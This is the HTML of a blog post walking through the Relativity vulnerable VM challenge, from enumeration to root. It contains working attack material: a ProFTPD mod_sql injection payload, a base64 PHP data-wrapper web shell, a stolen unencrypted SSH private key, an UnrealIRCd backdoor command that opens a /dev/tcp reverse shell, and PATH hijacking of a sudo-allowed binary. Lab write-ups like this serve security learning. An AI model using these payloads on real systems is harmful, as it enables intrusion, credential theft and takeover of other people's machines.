<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>slash root slash flag dot txt Solving the Relativity Vulnerable VM | #!/bin/note
</title>
<meta name=keywords content>
<meta name=description content="foreword
At the time of writing this post, this VM was part of a local security communities (zacon) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at VulnHub. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.
I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="slash root slash flag dot txt Solving the Relativity Vulnerable VM">
<meta property="og:description" content="foreword
At the time of writing this post, this VM was part of a local security communities (zacon) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at VulnHub. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.
I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2013-11-18T00:00:00+00:00">
<meta property="article:modified_time" content="2013-11-18T00:00:00+00:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="slash root slash flag dot txt Solving the Relativity Vulnerable VM">
<meta name=twitter:description content="foreword
At the time of writing this post, this VM was part of a local security communities (zacon) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at VulnHub. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.
I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"slash root slash flag dot txt Solving the Relativity Vulnerable VM","item":"https://leonjza.github.io/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"slash root slash flag dot txt Solving the Relativity Vulnerable VM","name":"slash root slash flag dot txt Solving the Relativity Vulnerable VM","description":"foreword At the time of writing this post, this VM was part of a local security communities (zacon) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at VulnHub. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.\nI think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.\n","keywords":[],"articleBody":"foreword At the time of writing this post, this VM was part of a local security communities (zacon) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at VulnHub. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.\nI think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.\nthe challenge It all started with an announcement on the Zacon mailing list. A friendly heads-up about the challenge and some details were made available. We were given a hostname of where the challenge lived with clear instructions to find flag.txt. Sounds simple. I slapped the hostname as a url in a browser and was met with a image of M.C. Eshter’s ‘Relativity’. Great. Something to start thinking about. I also nmapped the box. I mean, how else would you start, right? :)\n# 192.168.56.21 Nmap Nmap scan report for 192.168.56.21 (192.168.56.21) Host is up (0.0024s latency). Not shown: 997 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Alright. This gives you a good idea of whats happening on the host, as well as some points to start off with.\ninitial enumeration Enumeration is key to starting something like this. The more you know about the host, the more you are able to adapt and think about as you go through the challenge. So, we know we have a SSH Server, a FTP server and a Web server exposed.\nStarting with the SSH server, I tried to check if password based authentication was on. Maybe Mr MC Eshter had an account on this box? You never know :)\n$ ssh eshter@192.168.56.21 Permission denied (publickey). So, we now know only key based authentication works. Thats fine. Next up was the FTP service.\n$ ftp 192.168.56.21 Connected to 192.168.56.21. 220 Welcome to Relativity FTP (mod_sql) Name (192.168.56.21:root): anonymous 331 Password required for anonymous. Password: 530 Login incorrect. Login failed. Remote system type is UNIX. Using binary mode to transfer files. ftp No anonymous FTP logins either. It appears that the Server’s FTP banner has been customised and is maybe using the mod_sql plugin. A quick Google for mod_sql revealed that this may be ProFTPD with the mod_sql plugin. Great. This is an important piece of information. To complete the enumeration I moved on to the web server. It was time to inspect some request responses.\n$ curl -v 192.168.56.21 * About to connect() to 192.168.56.21 port 80 (#0) * Trying 192.168.56.21... * connected * Connected to 192.168.56.21 (192.168.56.21) port 80 (#0)  GET / HTTP/1.1  User-Agent: curl/7.26.0  Host: 192.168.56.21  Accept: */*  * additional stuff not fine transfer.c:1037: 0 0 * HTTP 1.1 or later with persistent connection, pipelining supported M.C. Escher - Relativity      * Closing connection #0 putting the enumeration together With the little bit of poking around we have just done, we are able to say that this may be a Fedora Core Server, running Apache 2.2.13, with ProFTPD and the mod_sql plugin. This already gives us quite a lot to work with in the sense of researching the respective software in search of known vulnerabilities.\nWith me loving web based security, my first attempt at further enumerating the machine was via the web server. I searched for cgi-bin/ type problems, potentially hidden directories via robots.txt, username enumeration via home directories etc. to no avail. At some stage it became very apparent that the initial entry point for this server was not via the Web.\nthe initial attack The next step was the FTP server. As it was purposely disclosing the fact that it was using mod_sql, instinct kicked in and I attempted to check the responses if I tried to login with username ' and password '.\n# ftp 192.168.56.21 Connected to 192.168.56.21. 220 Welcome to Relativity FTP (mod_sql) Name (192.168.56.21:root): ' 331 Password required for '. Password: 421 Service not available, remote server has closed connection Login failed. No control connection for command: Success ftp As you can clearly see, the response does differ from when I initially attempted to login as anonymous. This highly suggests that one of the fields is SQL injectable. And so, it was research time. Using good ‘ol trusty Google, I searched for proftpd mod_sql injection vulnerability. Hey presto! The very first hit describes a vulnerability disclosed in 2009.\nFrom this research, we can be pretty confident in thinking that this specific FTP server may as well be vulnerable to the exact same vulnerability, and may very well be our first entry point into the system. Sample exploits are available here, and as such I attempted to exploit this. I copied the SQLi payload from the website %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; -- and pasted this as the username, whereafter I provided 1 as the password.\n# ftp 192.168.56.21 Connected to 192.168.56.21. 220 Welcome to Relativity FTP (mod_sql) Name (192.168.56.21:root): %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; -- 331 Password required for %'). Password: 421 Service not available, remote server has closed connection Login failed. No control connection for command: Success ftp bye No dice. :| Ok, well I guess I couldn’t have expected it to be that easy. This caused me to dig even deeper and research exactly what the problem is, and why this vulnerability exists. Eventually, I got hold of a vulnerable version of the software, set it up in a LAB VM, and tested the SQLi payload until it worked. I ended up with a slightly different payload to the ones available online.\n# ftp 192.168.56.21 Connected to 192.168.56.21. 220 Welcome to Relativity FTP (mod_sql) Name (192.168.56.21:root): %') and 1=2 union select 1,1,uid,gid,homedir,shell from users;# 331 Password required for %'). Password: 230 User %') and 1=2 union select 1,1,uid,gid,homedir,shell from users;# logged in. Remote system type is UNIX. Using binary mode to transfer files. ftp w00t. Notice the difference though? The SQL commenting was changed from – to #. Apparently, MySQL is pretty finicky about the fact that the – style comments should have a space afterwards. This means that a payload ending with say, from users; -- NOTHING_OF_VALUE would have worked too. Just putting a space after the – did not work as the software most probably does a type of trim() on the field, hence the need to have something after the space too. Awesome, something learnt.\nweb based attack Now that we have FTP access to the host, we simply needed to ls to learn what is the next step.\nftp ls 200 PORT command successful 150 Opening ASCII mode data connection for file list drwxr-xr-x 3 root root 4096 Mar 5 2013 0f756638e0737f4a0de1c53bf8937a08 -rw-r--r-- 1 root root 235423 Mar 5 2013 artwork.jpg -rw-r--r-- 1 root root 130 Mar 5 2013 index.html 226 Transfer complete. ftp cd 0f756638e0737f4a0de1c53bf8937a08 550 0f756638e0737f4a0de1c53bf8937a08: Permission denied ftp A directory called ‘0f756638e0737f4a0de1c53bf8937a08’ was present, however our FTP user does not have access to this. We are able to deduce that this is in the web folder based on the content of the directory we have access to. So, time to slap http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08 into a web browser.\nexploiting the web based vulnerability Browsing to the above mentioned URL revealed a PHP driven website filled with information about the Relativity artwork. While this in itself was interesting, the real interest was in the url’s to different parts of the website. More specifically, the urls were composed as index.php?page=definition.php. Immediately this suggested that the file index.php was programmed to include other files in order to render the content. In the examples case it included definition.php.\nMy first attempts to exploit this was very successful. For this kind of potential vulnerability, I have a small PHP data stream wrapper shell in my toolbox. Normally, the shell looks something like this:\n?file=data:,php system($_GET[c]); ?\u0026c=ls Sometimes however, sites tend to attempt to filter out certain PHP commands. So, in order to increase the chances of success, a base64 encoded version ends up being my favourite:\n?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=\u0026c=dir I used this and now had shell access to the box. Remembering the basic tips of enumerate-exploit-post-exploit, I ran a few simple commands, just to get a better feel for the environment that I was facing. I was using Google Chrome. If you add ‘view-source:’ to the front of a url, or right click- view source, then you will see the output for your command shell in a much neater and easier to read layout. I ran the commands id; uname -a; sestatus; pwd; ls -lah /home; cat /etc/passwd:\n  From this we know that the server is running Fedora Core 17, with the 3.9.8-100 kernel. SELinux is disabled. There are 2 users with /home directories, of which jetta’s directory is protected from me reading it at the moment. root, mauk and jetta all have valid logins shells too.\nTaking one quick step back, I investigated the sources of the website in order to maybe find some credentials that may attach this website to a database or something similarly useful. While doing this, I noticed the index.php page was in fact doing partial input validation, which may cause some web shells not to work :)\n$blacklist_include=array(\"php://\"); for ($i=0; $icount($blacklist_include); $i++){ if (strpos($_GET['page'],$blacklist_include[$i]) !== false){ die(); } } $page = $_GET['page']; include ($page); gaining further access From here you can of course take the time to set yourself up with a very nice interactive shell using this web based remote file inclusion vulnerability. However, browsing around the file system its clear that you can browse in the user mauk’s home directory. While the directory itself has nothing of real value, there are still the hidden directories to view. Usually, these include things such as the users bash_history, bashrc etc. Also, ssh key related information would typically reside inside .ssh/. In this users .ssh/ directory, he left he’s SSH private key there, with permissions set so that anyone can read it. So, using the web based remote file include shell we are able to steal this off the server with the command cat /home/mauk/.ssh/id_rsa, which would echo us the key.\n-----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0 9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ 5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6 zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6 Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7 szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ +Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy 3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x 3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0 ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg== -----END RSA PRIVATE KEY----- What is particularly important to note here is the fact that this private key is not password protected. Usually, password protected keys would have a line such as Proc-Type: 4,ENCRYPTED indicating this. This key does not. So, using this, it would be as easy as specifying a private key to use when connecting and viola. I saved the the contents of id_rsa to a file called key, and specified it to be used when connecting with the -i flag:\n# ssh mauk@192.168.56.21 -i key [mauk@Relativity ~]$ id uid=1001(mauk) gid=1001(mauk) groups=1001(mauk) [mauk@Relativity ~]$ w00t. Now, we have a proper interactive shell as the user mauk! :)\nenumerating the next step Again, enumerate-exploit-post-exploit are very important steps. Now we find ourselves at the post-exploitation part again. Learn as much as you can about everything you can. Having the interactive SSH session that we have now, it was a breeze to learn quite a lot about the server. More importantly, learning about that which we also don’t have access to.\nEnumeration is not just about files and the access. It also includes network interfaces, configuration etc. In the user mauk’s case, he had a .bash_history file, which revealed the key to the next part of the challenge. I also noticed port 6667 (irc) being open locally along with a ircd running as the user jetta.\n[mauk@Relativity ~]$ cat .bash_history ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N su - exit su - [mauk@Relativity ~]$ The bash_history confirmed the use of the ircd, and as such, I re-setup my ssh connection to the server, this time forwarding port 6667 to my laptop so that I may connect to it with a local irc client. The ssh command now looked something like this: ssh -L 6667:127.0.0.1:6667 mauk@192.168.56.21 -i key\ngood ‘ol irc With the now forwarded IRC port, my local client connected to the irc service, and the following MOTD was sent:\nConnecting… Connected *** Looking up your hostname... *** Couldn't resolve your hostname; using your IP address instead Logged in Welcome to the Relativity IRC Network bobsmith!bobsmith@localhost Your host is relativity.localdomain, running version Unreal3.2.8.1 This server was created Thu Feb 28 2013 at 17:54:35 EST relativity.localdomain Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 are supported by this server WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~\u0026@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=Relativity CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~\u0026@%+ are supported by this server EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP are supported by this server There are 1 users and 0 invisible on 1 servers I have 1 clients and 0 servers Current Local Users: 1 Max: 1 Current Global Users: 1 Max: 1 - relativity.localdomain Message of the Day - - 9/7/2013 9:17 - __________ .__ __ .__ .__ __ - \\______ \\ ____ | | _____ _/ |_|__|__ _|__|/ |_ ___.__. - | _// __ \\| | \\__ \\\\ __\\  \\  \\/ / \\  __\\  ___/| |__/ __ \\| | | |\\  /| || | \\___ | - |____|_ /\\___ ____(____ /__| |__| \\_/ |__||__| / ____| ·VM· - \\/ \\/ \\/ \\/ End of /MOTD command. Toying around with the IRC service did not yeald much results. No useful channels or anything funny was found with the service. However, the actual server that was running was UnrealIRCD v 3.8.2.1 as can be seen in the servers MOTD. Again, using this amazing tool called Google, I checked whats up with this version of UnrealIRCD. Lo and behold the first hit ‘UnrealIRCD 3.2.8.1 Backdoor Command Execution - Rapid7’. Excellent. Seems like this version has a remote command execution backdoor. The hit on Google to Rapid7’s actually links to a Metasploit module for this exact same backdoor.\nIt was time to research the vulnerability a bit, just to understand what exactly is going on here. A great resource was found here, where it was explained that a piece of code exists #define DEBUG3_DOLOG_SYSTEM(x) system(x), that does a system command if it sees traffic prepended with AB;. Alright. I didn’t have metasploit immediately available, so I opted for the nc shell, just to test it out. To my disappointment, it seemed like I missed something very important here as I received no output when issuing commands.\nSo back to the drawing board it was. I decided to download and compile my own local version of the backdoored ircd daemon, and test what the expected result of this backdoor should be. At the same time I also learnt a little about unrealircd itself and how to configure it. win :)\nEventually I got the daemon running and was able to test the backdoor locally. Still, no command output was received when commands were issued, however, I did notice that the commands themselves actually do execute. I echoed ‘a’ to a file in /tmp/ via the backdoor, and in a SSH session confirmed that it now existed.\nSo, back on the challenge vm, I have port 6667 still forwarded locally. To test this, I ran a command to list the contents of /home/ and redirect the output to a file in /tmp.\n# echo \"AB; ls -lah /home/  /tmp/1\" | nc 127.0.0.1 6667 :relativity.localdomain NOTICE AUTH :*** Looking up your hostname... :relativity.localdomain NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead :relativity.localdomain 451 AB; :You have not registered ^C Back on the SSH session I had with mauk’s account, /tmp/1 appeared, however without permissions for me to see it. So, I reran the previous command, substituting the backdoor command to chmod 777 /tmp/1. I reran the cat on /tmp/1 in mauk’s session and bam:\nmauk@Relativity ~]$ cat /tmp/1 total 16K drwxr-xr-x. 4 root root 4.0K Feb 25 2013 . dr-xr-xr-x. 18 root root 4.0K Feb 28 2013 .. drwx------. 4 jetta jetta 4.0K Sep 28 10:03 jetta drwxr-xr-x. 3 mauk mauk 4.0K Jul 9 08:55 mauk Oh yes! Its working! In a broken kind of way, but it works! To make my life a little easier, I changed the backdoor command to actually give me a back connect bash shell so that I can have a interactive session. Its a time saving thing really. My command to the IRCd was now echo \"AB; bash -i \u0026 /dev/tcp//6676 0\u00261\" | nc 127.0.0.1 6667. On my machine I opened a netcat listener on port 6676 and waited for the session to spawn:\n# nc -vnlp 6676 listening on [any] 6676 ... connect to [] from (UNKNOWN) [192.168.56.21] 53493 bash: no job control in this shell [jetta@Relativity Unreal]$ Great. Now it will be a lot easier to navigate around. Spawing the shell the way I did started me off in /opt/Unreal, which was a directory I previously did not have access to. I poked around here for a bit, trying to see if I missed anything with regards to the IRC setup. Nothing was immediately apparent, so, I moved on to the rest of the machine. More specifically, in jetta’s home directory, there was a binary called auth_server, owned by root, but with no suid bit. I attempted to execute the binary, and was greeted by a spinning pipe, and eventually a ‘error(12)’ after a classic cowsay.\n[jetta@Relativity ~]$ ls -lah auth_server/auth_server ls -lah auth_server/auth_server -rwxr-xr-x 1 root root 7.9K Mar 8 2013 auth_server/auth_server [jetta@Relativity ~]$ auth_server/auth_server auth_server/auth_server [+] Checking Certificates...done [+] Contacting server, please wait...- ____________________________ / Windows 2000 is out! \\ | | \\ -- PC Magazine, April 2013 / ---------------------------- \\  ^__^ \\  (oo)\\_______ (__)\\  )\\/\\  ||----w | || || could not establish connection error: (12) [jetta@Relativity ~]$ Right… well that is not exactly very helpful… or is it? Admittedly, this was the part that cost me the most time. I got lost on a path which is lead by enum-sploit-post, and wandered off into a world of binary analysis, process packet sniffing and eventually reverse engineering. Initially, I somehow figured that auth_server should be running, and should provide the IRCd with NickServ capabilities, so that maybe I could VHOST to a vDomain of a operator account, IDENT as him and then discover other hidden treasures…\nGranted, I did do some basic enum, and figured after I ran id and saw that the account for jetta was not in any fancy groups, there was nothing more to see here.\nEVENTUALLY, after a number of tactical coffees and rethinking of what I have seen so far, I came back to re-attempt this.\nthe shortest straw I reran auth_server a few more times, and decided to push the binary through strings one more time, just to see if maybe the clue will be more clear now:\n# strings auth_server /lib64/ld-linux-x86-64.so.2 __gmon_start__ libc.so.6 fflush puts putchar printf poll stdout system __libc_start_main GLIBC_2.2.5 l$ L t$(L |$0H [+] Checking Certificates... done [+] Contacting server, please wait... could not establish connection invalid certificates error: (12) fortune -s | /usr/bin/cowsay Starting Auth server.. ;*3$\" This did not help me get what I was clearly missing, and so, I went back to the enumeration step. What do I know about my current environment? WHERE do I have access now? WHAT access do I have? Anything different here that I may be missing. Eventually, I tried to so a sudo -l, which should list the commands I am allowed to run with sudo. Because my shells were all build with netcat, I had no proper tty to work with, so, sudo would complain about this. A quick fix with python, and all is well again:\n[jetta@Relativity ~]$ sudo -l sudo -l sudo: sorry, you must have a tty to run sudo [jetta@Relativity ~]$ python -c \"import pty;pty.spawn('/bin/sh');\" python -c \"import pty;pty.spawn('/bin/sh');\" sh-4.2$ sudo -l sudo -l Matching Defaults entries for jetta on this host: requiretty, env_keep=\"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS\", env_keep+=\"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\", env_keep+=\"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\", env_keep+=\"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\", env_keep+=\"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY PATH\", env_reset User jetta may run the following commands on this host: (root) NOPASSWD: /home/jetta/auth_server/auth_serveyr sh-4.2$ And there it is! auth_server may be run as root with no password requirement! \\o/. Immediately I jumped to running sudo /home/jetta/auth_server/auth_server, just to be met with the same fate of ‘error(12)’. While playing with the binary earlier, I was however convinced that this error(12) thing was exactly what it was configured to do and nothing more. Yes, thats it. Simply write the ‘Checking Certs’, ‘Contacting Server’ part, then, run fortune -s | /usr/bin/cowsay and error(12).\n… wait a sec. fortune is not called from its full relative path, however /usr/bin/cowsay is. This means if I can fool the binary into thinking something else is this fortune command, then I may be able to root the box. Especially if I can make it think my bash shell is fortune :)\nfinishing off With all the knowledge I have gained now, I moved on to finishing off by rooting the box. This was achieved by firstly creating a script called fortune, which was simply the old bash command pushed over /dev/tcp again, and placing it in /home/jetta/bin. I then ensured that fortune was executable and tested it by just running it alone. It was working fine :)\nNext, I have to fool the auth_server binary to think that my new fortune script is in fact the one it was looking for. To do this, I added a path to the PATH env variable, and rehashed the bins. Lastly, I ran auth_server as root, and switched to my last nc listener on port 6677…\n$ python -c \"import pty;pty.spawn('/bin/sh');\" sh-4.2$ export PATH=/home/jetta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin [+] Checking Certificates...done [+] Contacting server, please wait...could not establish connection error: (12) auth_server did its usual trick with error(12), however, my netcat listener now had a root prompt \\o/\n# nc -lvp 6677 listening on [any] 6677 ... 192.168.56.21: inverse host lookup failed: Unknown server error : Connection timed out connect to [] from (UNKNOWN) [192.168.56.21] 38267 [root@Relativity jetta]# id id uid=0(root) gid=0(root) groups=0(root) [root@Relativity jetta]# locate flag.txt locate flag.txt /root/flag.txt [root@Relativity jetta]# cat /root/flag.txt cat /root/flag.txt 65afa0e5928b98f7ae283e16df2d43bf [root@Relativity jetta]# As you can see, flag.txt was found by simply using the locate command for the file. Because I am now root, I have no troubles reading it, and as such, the challenge was considered completed!\n","wordCount":"3922","inLanguage":"en","datePublished":"2013-11-18T00:00:00Z","dateModified":"2013-11-18T00:00:00Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
